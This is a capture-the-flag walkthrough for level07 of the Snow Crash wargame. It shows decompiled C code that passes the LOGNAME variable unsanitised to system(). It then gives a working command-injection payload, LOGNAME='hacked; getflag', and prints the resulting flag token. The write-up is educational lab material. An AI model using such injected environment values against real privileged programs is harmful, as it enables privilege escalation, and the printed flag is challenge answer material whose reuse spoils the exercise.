## Snow Crash - Level07 Walkthrough

### 🧩 Challenge Discovery

After logging into `level07`, we find a single binary in the home directory:
```bash
level07@SnowCrash:~$ ls
level07
```

### 🔍 Analyzing the Binary

Upon analysis (e.g., using Ghidra or `gdb`), the binary structure looks like this:

```c
int main(int argc, char **argv, char **envp) {
  char *pcVar1;
  int iVar2;
  char *ret;
  __gid_t gid = getegid();
  __uid_t uid = geteuid();
  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);
  ret = NULL;
  pcVar1 = getenv("LOGNAME");
  asprintf(&ret, "/bin/echo %s ", pcVar1);
  iVar2 = system(ret);
  return iVar2;
}
```

### 🧠 Understanding the Vulnerability

The vulnerable line is:
```c
asprintf(&ret, "/bin/echo %s ", pcVar1);
system(ret);
```

- It uses the environment variable `LOGNAME` **directly** in a `system()` call.
- This makes it a **classic command injection** vulnerability.
- Since the variable is not sanitized or escaped, we can inject additional commands.

### 🧪 Exploit Attempt via GDB (Failed)

Initially, an attempt was made to change the `ret` variable to `/bin/getflag` using `gdb`:
```gdb
set variable buffer = "/bin/getflag"
```

However, this failed because `asprintf` gets called again afterwards, overwriting the value.

### 💥 Working Exploit Using Environment Variable

Instead, we set the environment variable `LOGNAME` to inject a second command:

```bash
LOGNAME='hacked; getflag'
./level07
```

### ✅ Result

```
hacked
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

### 📚 Notes

- This challenge demonstrates a **command injection** through an unsanitized environment variable.
- Always sanitize user input before using it in system calls.
- This kind of bug often appears in scripts or binaries that rely on environment input without validation.
